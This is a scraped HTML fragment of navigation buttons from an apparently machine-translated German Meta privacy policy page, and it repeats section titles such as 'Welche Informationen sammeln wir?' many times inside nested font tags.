                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie verwenden wir Ihre Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Ihre Informationen an Meta Products oder integrierte Partner weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie geben wir Informationen an Dritte weiter?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie ist die Zusammenarbeit zwischen Meta Companies organisiert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie können Sie Ihre Daten verwalten oder löschen und Ihre Rechte ausüben?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie lange bewahren wir Ihre Daten auf?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie übermitteln wir Informationen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie reagieren wir auf behördliche Anfragen, halten geltende Gesetze ein und beugen Schäden vor?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Woher wissen Sie, wann sich die Richtlinie ändert?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie stelle ich Metafragen?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Warum und wie wir Ihre Daten verarbeiten</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was ist die Datenschutzrichtlinie und was deckt sie ab?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Welche Informationen sammeln wir?</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
